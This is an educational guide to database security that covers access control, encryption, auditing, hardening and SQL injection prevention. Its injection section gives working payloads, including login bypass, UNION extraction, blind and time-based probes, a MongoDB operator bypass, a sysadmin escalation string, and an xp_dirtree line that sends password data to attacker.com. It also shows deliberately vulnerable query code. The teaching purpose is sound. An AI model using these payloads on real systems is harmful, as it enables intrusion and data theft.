# 06 Database Security

## Table of Contents

1. [Overview](#overview)
2. [Database Security Fundamentals](#database-security-fundamentals)
3. [Database Access Control](#database-access-control)
4. [Database Authentication](#database-authentication)
5. [Database Encryption](#database-encryption)
6. [SQL Injection](#sql-injection)
7. [Database Auditing and Compliance](#database-auditing-and-compliance)
8. [Secure Database Configuration](#secure-database-configuration)
9. [Database-Specific Threats](#database-specific-threats)
10. [NoSQL Security](#nosql-security)
11. [Best Practices](#best-practices)

## Overview

**Database security** encompasses the tools, controls, and measures designed to protect database management systems (DBMS) from threats and vulnerabilities. Databases are high-value targets containing sensitive information, making their security critical to organizational risk management.

### Security Objectives for Databases

| Objective | Description | Security Controls |
|-----------|-------------|------------------|
| **Confidentiality** | Protect sensitive data from unauthorized disclosure | Encryption, access control, data masking |
| **Integrity** | Prevent unauthorized modification or corruption | Constraints, triggers, checksums, backups |
| **Availability** | Ensure database accessible to authorized users | Redundancy, backup/recovery, DDoS protection |
| **Accountability** | Track database operations for audit | Logging, auditing, change tracking |

## Database Security Fundamentals

### The Database Threat Landscape

**Common Database Threats:**

| Threat | Description | Impact |
|--------|-------------|--------|
| **SQL Injection** | Malicious SQL code injection through inputs | Data breach, manipulation, deletion |
| **Privilege Escalation** | Unauthorized elevation of user privileges | Full database compromise |
| **Credential Theft** | Stolen database credentials | Unauthorized access |
| **Insider Threats** | Malicious or negligent insiders | Data exfiltration, sabotage |
| **Weak Authentication** | Poor password policies, no MFA | Easy unauthorized access |
| **Unpatched Vulnerabilities** | Missing security patches | Exploitation of known flaws |
| **Excessive Privileges** | Users with unnecessary permissions | Larger attack surface |
| **Backup Exposure** | Unsecured database backups | Offline data access |
| **Inference Attacks** | Deducing sensitive data from queries | Privacy violations |
| **DoS/DDoS** | Overwhelming database resources | Service unavailability |

### Defense in Depth for Databases

Multiple security layers: Network Security (Firewalls, Segmentation) → Authentication (Strong credentials, MFA) → Authorization (RBAC, least privilege) → Encryption (TDE, column encryption) → Auditing (Logs, monitoring) → Secure Configuration

## Database Access Control

### Database-Specific Access Control Models

#### Discretionary Access Control (DAC) in Databases

Users control access to objects they own.

**SQL Example (PostgreSQL):**
```sql
-- Create table (owner: alice)
CREATE TABLE employees (
    id INT PRIMARY KEY,
    name VARCHAR(100),
    salary DECIMAL(10,2)
);

-- Grant permissions
GRANT SELECT ON employees TO bob;
GRANT SELECT, INSERT ON employees TO charlie;

-- Revoke permissions
REVOKE INSERT ON employees FROM charlie;
```

**Advantages**: Flexible, users control data, granular permissions

**Disadvantages**: Hard to enforce policies, users may grant excessive permissions, difficult auditing

#### Mandatory Access Control (MAC) in Databases

Access based on security labels and clearance levels.

**Implementation:**
- Oracle Label Security
- Row-level security with classification labels
- Enforced by DBMS, users cannot override

**Example Scenario:**
```
Data Classification Levels:
  - Top Secret (TS)
  - Secret (S)
  - Confidential (C)
  - Unclassified (U)

User Clearances:
  - Alice: TS clearance → can access TS, S, C, U
  - Bob: S clearance → can access S, C, U only
```

#### Role-Based Access Control (RBAC)

Permissions assigned to roles, users assigned to roles.

**RBAC Hierarchy Example:**
```sql
-- Create roles
CREATE ROLE dba;
CREATE ROLE developer;
CREATE ROLE analyst;
CREATE ROLE guest;

-- Grant permissions to roles
GRANT ALL PRIVILEGES ON DATABASE mydb TO dba;
GRANT SELECT, INSERT, UPDATE ON ALL TABLES IN SCHEMA public TO developer;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO analyst;
GRANT SELECT ON public_data TO guest;

-- Assign users to roles
GRANT developer TO alice;
GRANT analyst TO bob;
GRANT guest TO charlie;
```

**Role Hierarchy:**
```
DBA
 ├─→ Full control (DDL, DML, DCL)
 │
Developer
 ├─→ Read/Write data
 ├─→ Create/modify objects in dev schema
 │
Analyst
 ├─→ Read-only access
 ├─→ Can run reports
 │
Guest
 └─→ Limited read access to public data
```

**Advantages**: Easier management, aligns with org structure, simplifies auditing, reduces overhead

#### Row-Level Security (RLS)

Fine-grained access control at the row level based on user context.

**PostgreSQL Example:**
```sql
CREATE TABLE documents (
    id INT PRIMARY KEY,
    title VARCHAR(200),
    content TEXT,
    department VARCHAR(50),
    classification VARCHAR(20)
);

-- Enable row-level security
ALTER TABLE documents ENABLE ROW LEVEL SECURITY;

-- Policy: Users can only see their department's documents
CREATE POLICY dept_policy ON documents
    FOR SELECT
    USING (department = current_user_department());

-- Policy: Users with TS clearance see all, others see only Unclassified
CREATE POLICY clearance_policy ON documents
    FOR SELECT
    USING (
        classification = 'Unclassified'
        OR current_user_clearance() >= classification_level(classification)
    );
```

**Use Cases:**
- Multi-tenant SaaS applications
- Departmental data segregation
- Security clearance enforcement
- Data sovereignty requirements

#### Column-Level Security

Restrict access to specific columns.

**SQL Server Example:**
```sql
-- Grant SELECT on specific columns only
GRANT SELECT ON employees(id, name, department) TO analyst_role;
-- analyst_role cannot see 'salary' column

-- Dynamic data masking
ALTER TABLE employees
ALTER COLUMN salary ADD MASKED WITH (FUNCTION = 'default()');
-- Non-privileged users see masked values
```

### Principle of Least Privilege in Databases

**Implementation:**

1. **Grant minimum necessary permissions** (e.g., SELECT/INSERT/UPDATE on specific tables, not ALL PRIVILEGES)
2. **Separate accounts**: Admin (DBA tasks), Application (limited data access), Read-only (reporting), Backup (backup ops)
3. **Avoid root/superuser**: Never use sa/postgres/root for applications, create dedicated accounts

## Database Authentication

### Database User Authentication

#### Password-Based Authentication

**Best Practices:**
- **Minimum password length**: 12-16 characters
- **Password complexity**: Enforce strong password requirements
- **Password expiration**: Balance security with usability (90-180 days)
- **Account lockout**: Temporarily lock after N failed attempts (e.g., 5)
- **Password history**: Prevent reuse of recent passwords

**SQL Server Example:**
```sql
-- Create login with password policy
CREATE LOGIN app_user WITH PASSWORD = 'ComplexP@ssw0rd!',
    CHECK_POLICY = ON,
    CHECK_EXPIRATION = ON;

-- Set password expiration
ALTER LOGIN app_user WITH PASSWORD = 'NewP@ssw0rd!',
    OLD_PASSWORD = 'ComplexP@ssw0rd!';
```

**Storing Database Passwords:**
- **Never**: Hardcode in source code or store in plain text
- **Use**: Environment variables, secret management services (HashiCorp Vault, AWS Secrets Manager), encrypted config files

#### External Authentication

**LDAP/Active Directory Integration:**
```sql
-- PostgreSQL with LDAP
-- pg_hba.conf:
host    all    all    0.0.0.0/0    ldap ldapserver=ldap.company.com ldapbasedn="dc=company,dc=com"
```

**Kerberos Authentication:**
```sql
-- PostgreSQL with Kerberos
-- pg_hba.conf:
host    all    all    0.0.0.0/0    gss include_realm=0 krb_realm=COMPANY.COM
```

**Benefits**: Centralized user management, SSO, consistent password policies, automated provisioning/deprovisioning

#### Certificate-Based Authentication

**PostgreSQL SSL Certificate Authentication:**
```bash
# Generate client certificate
openssl req -new -nodes -keyout client.key -out client.csr
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -out client.crt

# pg_hba.conf:
hostssl all all 0.0.0.0/0 cert clientcert=verify-full
```

**Advantages**: Strong cryptographic authentication, no password management, suitable for service-to-service, HSM support

### Multi-Factor Authentication for Databases

**Implementation Strategies**: Database + External MFA (Duo/Okta), VPN + Database (MFA required), Bastion Host (jump server with MFA), Application-Level MFA

## Database Encryption

### Encryption at Rest

#### Transparent Data Encryption (TDE)

Encrypts entire database files at the storage level.

**SQL Server TDE:**
```sql
-- Create master key
USE master;
CREATE MASTER KEY ENCRYPTION BY PASSWORD = 'SecurePassword123!';

-- Create certificate
CREATE CERTIFICATE TDE_Cert WITH SUBJECT = 'TDE Certificate';

-- Create database encryption key
USE mydb;
CREATE DATABASE ENCRYPTION KEY
    WITH ALGORITHM = AES_256
    ENCRYPTION BY SERVER CERTIFICATE TDE_Cert;

-- Enable encryption
ALTER DATABASE mydb SET ENCRYPTION ON;
```

**Characteristics**: Transparent (no code changes), minimal performance overhead (hardware AES), encrypts data/log files and backups, critical key management

**Key Hierarchy:**
```
Master Database Key (encrypted with password/certificate)
   ↓ encrypts
Certificate
   ↓ encrypts
Database Encryption Key (DEK)
   ↓ encrypts
Data Files, Log Files, Backups
```

#### File-Level Encryption

Operating system or storage-level encryption.

**Examples:**
- **Linux**: LUKS (dm-crypt)
- **Windows**: BitLocker
- **Cloud**: AWS EBS encryption, Azure Disk Encryption

**Advantages**: Protects against physical theft, easier than TDE, OS-level key management

**Disadvantages**: Performance impact, no fine-grained control

#### Application-Level Encryption

Encrypt data before inserting into database.

**Example (Python):**
```python
from cryptography.fernet import Fernet

# Generate key (store securely, not in code!)
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt before insert
ssn = "123-45-6789"
encrypted_ssn = cipher.encrypt(ssn.encode())

# INSERT INTO employees (name, ssn) VALUES ('Alice', encrypted_ssn)

# Decrypt after SELECT
decrypted_ssn = cipher.decrypt(encrypted_ssn).decode()
```

**Advantages**: Fine-grained control, end-to-end encryption, no DB encryption support needed

**Disadvantages**: Complex logic, cannot query encrypted data directly, application manages keys

#### Column-Level Encryption

Encrypt specific sensitive columns.

**SQL Server Always Encrypted:**
```sql
CREATE COLUMN MASTER KEY MyCMK
WITH (
    KEY_STORE_PROVIDER_NAME = 'MSSQL_CERTIFICATE_STORE',
    KEY_PATH = 'CurrentUser/my/A66BB0F6DD70BDFF02B62D0F87E340288'
);

CREATE COLUMN ENCRYPTION KEY MyCEK
WITH VALUES
(
    COLUMN_MASTER_KEY = MyCMK,
    ALGORITHM = 'RSA_OAEP',
    ENCRYPTED_VALUE = 0x016E000001630075007200720...
);

-- Encrypt column
ALTER TABLE employees
ALTER COLUMN salary
    ADD ENCRYPTED WITH (
        COLUMN_ENCRYPTION_KEY = MyCEK,
        ENCRYPTION_TYPE = Deterministic,
        ALGORITHM = 'AEAD_AES_256_CBC_HMAC_SHA_256'
    );
```

**Encryption Types:**
- **Deterministic**: Same plaintext → same ciphertext (allows equality comparisons)
- **Randomized**: Same plaintext → different ciphertext (stronger security, no queries)

### Encryption in Transit

**TLS/SSL for Database Connections:**

**PostgreSQL:**
```bash
# postgresql.conf
ssl = on
ssl_cert_file = 'server.crt'
ssl_key_file = 'server.key'
ssl_ca_file = 'ca.crt'

# Require SSL
# pg_hba.conf:
hostssl all all 0.0.0.0/0 md5
```

**MySQL:**
```sql
-- Require SSL for user
CREATE USER 'app_user'@'%' IDENTIFIED BY 'password' REQUIRE SSL;

-- Check connection is encrypted
SHOW STATUS LIKE 'Ssl_cipher';
```

**Importance**: Prevents eavesdropping, protects credentials in transit, ensures data integrity

### Key Management

**Key Management Best Practices:**

1. **Separate key storage from data** (use dedicated key management systems)
2. **Hardware Security Modules (HSMs)** (FIPS 140-2 Level 2+: AWS CloudHSM, Azure Key Vault, Thales HSM)
3. **Key Rotation** (annually or after breach, maintain version history)
4. **Access Control for Keys** (strict permissions, audit access)
5. **Backup Key Material Securely** (encrypted backups, separate location)

## SQL Injection

**SQL Injection** is a code injection attack where malicious SQL statements are inserted into input fields, manipulating database queries.

### SQL Injection Attack Types

#### 1. Classic (In-Band) SQL Injection

**Vulnerable Code:**
```python
# VULNERABLE - Never do this!
username = request.POST['username']
password = request.POST['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)
```

**Attack:**
```
Input:  username = admin' --
        password = anything

Query:  SELECT * FROM users WHERE username='admin' --' AND password='anything'

Result: Password check bypassed (commented out)
```

**Another Attack:**
```
Input:  username = admin' OR '1'='1

Query:  SELECT * FROM users WHERE username='admin' OR '1'='1' AND password=''

Result: Always true condition, returns all users
```

#### 2. Union-Based SQL Injection

Attacker uses UNION to combine malicious query with legitimate one.

**Attack:**
```
Input:  product_id = 1 UNION SELECT username, password, NULL FROM users --

Query:  SELECT name, description, price
        FROM products
        WHERE id = 1
        UNION SELECT username, password, NULL FROM users --

Result: Returns product data AND all usernames/passwords
```

#### 3. Blind SQL Injection

No direct output, but attacker infers information from application behavior.

**Boolean-Based:**
```
Input:  id = 1' AND (SELECT COUNT(*) FROM users) > 10 --

If page behaves normally → COUNT(*) > 10 is true
If page shows error/different → COUNT(*) > 10 is false

Attacker iteratively determines exact count
```

**Time-Based:**
```
Input:  id = 1'; IF (SELECT COUNT(*) FROM users) > 10 WAITFOR DELAY '00:00:05' --

If response delayed by 5 seconds → condition is true
If immediate response → condition is false
```

#### 4. Second-Order SQL Injection

Malicious data stored in database, executed later.

```
Step 1: Register user with username: admin'--
        Stored in database: admin'--

Step 2: Application retrieves username and uses in query (without sanitizing):
        UPDATE users SET last_login = NOW() WHERE username = 'admin'--'

Result: Comments out rest of query, potentially causing issues
```

#### 5. Out-of-Band SQL Injection

Data exfiltrated through alternative channels (DNS, HTTP requests).

**SQL Server Example:**
```sql
'; EXEC master..xp_dirtree '\\attacker.com\' + (SELECT TOP 1 password FROM users) + '.txt' --
```

Result: Database makes DNS/SMB request to `attacker.com`, leaking password in domain name.

#### 6. NoSQL Injection

NoSQL databases also vulnerable to injection.

**MongoDB Example (Vulnerable):**
```javascript
// Vulnerable
db.users.find({
    username: req.body.username,
    password: req.body.password
});

// Attack:
POST /login
{ "username": {"$ne": null}, "password": {"$ne": null} }

// Resulting query finds first user where username and password are not null
```

### SQL Injection Prevention

#### 1. Parameterized Queries (Prepared Statements)

**SECURE - Always use this approach:**

**Python (psycopg2):**
```python
# Secure - parameterized query
username = request.POST['username']
password = request.POST['password']

cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)
)
```

**Java (JDBC):**
```java
// Secure
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

**PHP (PDO):**
```php
// Secure
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

**Node.js (pg):**
```javascript
// Secure
const result = await client.query(
    'SELECT * FROM users WHERE username = $1 AND password = $2',
    [username, password]
);
```

**Why It Works:**
- Database treats parameters as data, not executable code
- No possibility of SQL code injection
- Works for all user inputs

#### 2. Stored Procedures (with Proper Parameterization)

```sql
-- Create stored procedure
CREATE PROCEDURE AuthenticateUser
    @Username NVARCHAR(50),
    @Password NVARCHAR(50)
AS
BEGIN
    SELECT * FROM users
    WHERE username = @Username AND password = @Password;
END;

-- Call from application (parameterized)
EXEC AuthenticateUser @Username='alice', @Password='password123';
```

**Note:** Stored procedures alone don't prevent SQL injection if you concatenate strings inside them!

```sql
-- Still vulnerable!
CREATE PROCEDURE VulnerableProc
    @UserId NVARCHAR(50)
AS
BEGIN
    DECLARE @SQL NVARCHAR(MAX);
    SET @SQL = 'SELECT * FROM users WHERE id = ' + @UserId; -- VULNERABLE
    EXEC sp_executesql @SQL;
END;
```

#### 3. Input Validation

**Whitelist Validation:**
```python
# Validate product ID is an integer
product_id = request.GET.get('id')

try:
    product_id = int(product_id)  # Raises ValueError if not integer
except ValueError:
    return "Invalid product ID"

# Now safe to use (still use parameterized query)
cursor.execute("SELECT * FROM products WHERE id = %s", (product_id,))
```

**Pattern Matching:**
```python
import re

# Validate username contains only alphanumeric characters
username = request.POST['username']
if not re.match(r'^[a-zA-Z0-9_]+$', username):
    return "Invalid username format"
```

**Note:** Input validation is a defense-in-depth measure, NOT a replacement for parameterized queries.

#### 4. Escaping (Last Resort)

If parameterized queries are impossible (rare cases), escape special characters.

```python
# Python (psycopg2) - escaping as last resort
import psycopg2.extensions

username = psycopg2.extensions.adapt(username).getquoted().decode()
```

**Warning:** Escaping is error-prone and should be avoided. Use parameterized queries instead.

#### 5. Principle of Least Privilege

**Limit database user permissions:**
```sql
-- Application user should NOT have:
- DROP, CREATE permissions
- Access to system tables
- EXECUTE permissions on dangerous procedures (xp_cmdshell, OPENROWSET)

-- Grant only necessary permissions:
GRANT SELECT, INSERT, UPDATE ON orders TO app_user;
GRANT SELECT ON products TO app_user;
```

Even if SQL injection occurs, damage is limited.

#### 6. Web Application Firewall (WAF)

Deploy WAF to detect and block SQL injection attempts.

**WAF Rules:**
- Detect SQL keywords in unexpected parameters
- Block suspicious patterns (UNION, --, /*, xp_, etc.)
- Rate limiting to prevent automated attacks

**Example (ModSecurity Rule):**
```
SecRule ARGS "@detectSQLi" \
    "id:1000,phase:2,deny,status:403,msg:'SQL Injection Detected'"
```

**Note:** WAF is defense-in-depth, not a substitute for secure coding.

#### 7. Error Handling

**Don't expose database errors to users:**

**Bad:**
```
Error: You have an error in your SQL syntax near 'admin'' at line 1
```

**Good:**
```
An error occurred. Please try again later. (Error ID: 12345)
```

Log detailed errors server-side for debugging, show generic errors to users.

### SQL Injection Testing

**Manual Testing:**
```
# Test for vulnerability
' OR '1'='1
admin' --
' UNION SELECT NULL --
1' AND 1=1 --
1' AND 1=2 --
```

**Automated Tools:**
- **sqlmap**: Powerful SQL injection exploitation tool
- **OWASP ZAP**: Web application security scanner
- **Burp Suite**: Intercepting proxy with scanner
- **Acunetix**: Commercial web vulnerability scanner

**Testing Command (sqlmap):**
```bash
sqlmap -u "http://example.com/product?id=1" --batch --dbs
```

## Database Auditing and Compliance

### Database Auditing

**Auditing** tracks and logs database activities for security analysis and compliance.

**What to Audit:**
- Authentication attempts (successful and failed)
- Privileged operations (DDL statements)
- Data access (sensitive tables)
- Data modifications (INSERT, UPDATE, DELETE)
- Schema changes
- Permission changes

**SQL Server Audit Example:**
```sql
-- Create server audit
CREATE SERVER AUDIT DatabaseAudit
TO FILE (FILEPATH = 'C:\Audits\', MAXSIZE = 1GB);

-- Enable audit
ALTER SERVER AUDIT DatabaseAudit WITH (STATE = ON);

-- Create database audit specification
USE mydb;
CREATE DATABASE AUDIT SPECIFICATION AuditSpec
FOR SERVER AUDIT DatabaseAudit
    ADD (SELECT, INSERT, UPDATE, DELETE ON employees BY public),
    ADD (EXECUTE ON SCHEMA::dbo BY public)
WITH (STATE = ON);
```

**PostgreSQL Auditing (pgAudit):**
```sql
-- Install extension
CREATE EXTENSION pgaudit;

-- Configure auditing
ALTER SYSTEM SET pgaudit.log = 'read, write, ddl';
ALTER SYSTEM SET pgaudit.log_catalog = off;

-- Audit specific table
ALTER TABLE sensitive_data SET (pgaudit.log = 'read, write');
```

### Compliance Requirements

**GDPR (General Data Protection Regulation):**
- Data encryption (at rest and in transit)
- Access controls
- Audit logs (who accessed what data, when)
- Data minimization
- Right to erasure (ability to delete user data)
- Breach notification (72 hours)

**HIPAA (Health Insurance Portability and Accountability Act):**
- Encryption of Protected Health Information (PHI)
- Access controls and audit logs
- Business Associate Agreements (BAAs)
- Breach notification
- Data backup and disaster recovery

**PCI DSS (Payment Card Industry Data Security Standard):**
- Encrypt cardholder data
- Restrict access to cardholder data
- Maintain audit logs
- Regularly test security systems
- Maintain vulnerability management program

**SOX (Sarbanes-Oxley Act):**
- Audit trails for financial data
- Change control
- Access controls
- Data integrity verification

## Secure Database Configuration

### Secure Installation

**Initial Security Steps:**

1. **Change default passwords immediately**
   ```sql
   -- PostgreSQL
   ALTER USER postgres WITH PASSWORD 'SecurePassword123!';
   
   -- MySQL
   ALTER USER 'root'@'localhost' IDENTIFIED BY 'SecurePassword123!';
   ```

2. **Remove/disable default accounts**
   ```sql
   -- SQL Server
   DROP LOGIN ##MS_PolicyEventProcessingLogin##;
   
   -- MySQL
   DELETE FROM mysql.user WHERE User='';
   FLUSH PRIVILEGES;
   ```

3. **Remove sample/test databases**
   ```sql
   DROP DATABASE IF EXISTS test;
   DROP DATABASE IF EXISTS sample;
   ```

### Database Hardening

**Network Security:**
- Bind to specific IP address (not 0.0.0.0)
- Use non-standard ports (security through obscurity - minor benefit)
- Firewall rules: Allow only necessary IPs
- Disable remote root/admin login

**PostgreSQL Example:**
```bash
# postgresql.conf
listen_addresses = '10.0.1.5'  # Specific IP, not '*'
port = 54321  # Non-standard port (minor security benefit)

# pg_hba.conf - restrictive access
host    mydb    app_user    10.0.2.0/24    md5
host    all     all         0.0.0.0/0      reject
```

**Service Configuration:**
```sql
-- Disable dangerous features

-- SQL Server: Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- MySQL: Disable LOAD DATA LOCAL INFILE
SET GLOBAL local_infile = 0;

-- PostgreSQL: Disable untrusted languages
DROP LANGUAGE IF EXISTS plpythonu CASCADE;
```

**File System Permissions:**
```bash
# Linux - restrict database file permissions
chmod 700 /var/lib/postgresql/data
chown postgres:postgres /var/lib/postgresql/data

# Restrict configuration files
chmod 600 /etc/postgresql/postgresql.conf
```

### Patch Management

**Best Practices:**
- Subscribe to database vendor security advisories
- Test patches in development/staging before production
- Maintain patch schedule (critical: immediate, high: monthly, low: quarterly)
- Automate patching where possible
- Document patching procedures

**Example CVE Tracking:**
- PostgreSQL: https://www.postgresql.org/support/security/
- MySQL: https://www.mysql.com/support/security/
- SQL Server: Microsoft Security Response Center (MSRC)
- Oracle: Critical Patch Updates (CPU)

## Database-Specific Threats

### Inference Attacks

**Inference attack**: Deducing sensitive information by analyzing query results and database responses.

**Example Scenario:**
```sql
-- Attacker has SELECT on salary_ranges table:
SELECT AVG(salary) FROM employees WHERE department = 'Engineering';
-- Returns: $120,000

SELECT AVG(salary) FROM employees WHERE department = 'Engineering' AND name != 'Alice';
-- Returns: $118,000

-- Inference: Alice's salary ≈ $120,000 + (120-118) * N
-- where N = number of engineers
```

**Mitigation Strategies:**

1. **Query result size restrictions**
   ```sql
   -- Reject queries returning too few rows
   IF COUNT(*) < 5 THEN
       RAISE EXCEPTION 'Query result too small';
   END IF;
   ```

2. **Data perturbation/noise injection**
   - Add random noise to aggregate results
   - Balance privacy with utility

3. **Query auditing**
   - Monitor for sequences of related queries
   - Detect inference attack patterns

4. **Differential privacy**
   - Mathematical framework for privacy-preserving queries
   - Add calibrated noise to query results

### Privilege Escalation

Attacker gains higher privileges than authorized.

**Attack Vectors:**
- SQL injection → access to higher-privilege procedures
- Exploiting weak permissions on stored procedures
- Default/weak admin credentials
- Vulnerabilities in database software

**Example (SQL Server):**
```sql
-- Vulnerable stored procedure with EXECUTE AS OWNER
CREATE PROCEDURE GetUserData
    @UserId INT
WITH EXECUTE AS OWNER  -- Dangerous if owner has high privileges
AS
BEGIN
    EXEC('SELECT * FROM users WHERE id = ' + @UserId);  -- SQL injection vulnerability
END;

-- Attack:
EXEC GetUserData '1; EXEC sp_addsrvrolemember ''hacker'', ''sysadmin'' --'
-- Escalates 'hacker' to sysadmin role
```

**Prevention:**
- Principle of least privilege for all accounts
- Avoid EXECUTE AS OWNER unless necessary
- Regular privilege audits
- Disable unused features/procedures

### Backup Security

**Backup Risks:**
- Backup files contain full database (including sensitive data)
- Often stored with weak permissions
- May be forgotten on old servers/tapes

**Backup Security Best Practices:**

1. **Encrypt backups**
   ```sql
   -- SQL Server encrypted backup
   BACKUP DATABASE mydb
   TO DISK = 'C:\Backups\mydb.bak'
   WITH ENCRYPTION (
       ALGORITHM = AES_256,
       SERVER CERTIFICATE = BackupCert
   );
   ```

2. **Secure backup storage**
   - Separate storage from production database
   - Encrypted file system or cloud storage
   - Access controls on backup files

3. **Regular backup testing**
   - Verify backups can be restored
   - Test restore procedures
   - Check backup integrity

4. **Backup retention policy**
   - Define retention periods based on compliance requirements
   - Securely destroy old backups
   - Document retention policy

## NoSQL Security

NoSQL databases (MongoDB, Cassandra, Redis) have different security considerations.

### MongoDB Security

**Authentication:**
```javascript
// Enable authentication
use admin
db.createUser({
    user: "admin",
    pwd: "securePassword",
    roles: ["root"]
})

// Start mongod with authentication
mongod --auth --config /etc/mongod.conf
```

**Authorization:**
```javascript
// Create limited user
use mydb
db.createUser({
    user: "app_user",
    pwd: "appPassword",
    roles: [
        { role: "readWrite", db: "mydb" }
    ]
})
```

**NoSQL Injection Prevention:**
```javascript
// Vulnerable
db.users.find({ username: req.body.username, password: req.body.password });

// Attack: { "username": {"$ne": null}, "password": {"$ne": null} }

// Secure - validate input types
const username = String(req.body.username);
const password = String(req.body.password);

db.users.find({ username: username, password: password });
```

**Network Security:**
- Bind to localhost or specific IP
- Enable TLS/SSL
- Firewall rules

### Redis Security

**Authentication:**
```bash
# redis.conf
requirepass yourVeryStrongPasswordHere

# Disable dangerous commands
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command CONFIG ""
```

**Network Security:**
```bash
# Bind to specific IP
bind 127.0.0.1 10.0.1.5

# Disable protected mode only if firewalled
protected-mode yes
```

## Best Practices

### Database Security Checklist

**Access Control:**
- Implement role-based access control (RBAC)
- Enforce principle of least privilege
- Use row-level and column-level security where needed
- Regular access reviews and audits
- Disable/remove unused accounts

**Authentication:**
- Enforce strong password policies
- Implement multi-factor authentication for privileged accounts
- Use external authentication (LDAP/AD) for centralized management
- Never use default credentials

**Encryption:**
- Encrypt data at rest (TDE or file-level encryption)
- Encrypt data in transit (TLS/SSL for all connections)
- Encrypt backups
- Implement secure key management

**Application Security:**
- Always use parameterized queries / prepared statements
- Never concatenate user input into SQL queries
- Validate and sanitize all inputs
- Implement proper error handling (don't expose details)
- Use Web Application Firewall (WAF)

**Auditing and Monitoring:**
- Enable database auditing
- Log all authentication attempts
- Monitor for suspicious activity
- Implement alerting for security events
- Regular security assessments

**Configuration:**
- Change default passwords immediately
- Remove sample/test databases
- Disable unnecessary features
- Apply principle of least functionality
- Keep database software patched and updated

**Backup and Recovery:**
- Regular automated backups
- Encrypt backups
- Secure backup storage
- Test restore procedures regularly
- Documented disaster recovery plan

**Network Security:**
- Firewall rules restricting database access
- Network segmentation (DMZ, private subnets)
- VPN for remote database access
- Intrusion detection/prevention systems

### Security Testing

**Regular Security Assessments:**

1. **Vulnerability Scanning**
   - Tools: Nessus, OpenVAS, Qualys
   - Identify missing patches and misconfigurations
   - Schedule: Monthly or after changes

2. **Penetration Testing**
   - Simulated attacks to find vulnerabilities
   - Test SQL injection, privilege escalation, etc.
   - Schedule: Annually or after major changes

3. **Code Review**
   - Review database access code for security issues
   - Focus on SQL injection, access control, error handling

4. **Audit Review**
   - Analyze audit logs for suspicious activity
   - Verify compliance with policies
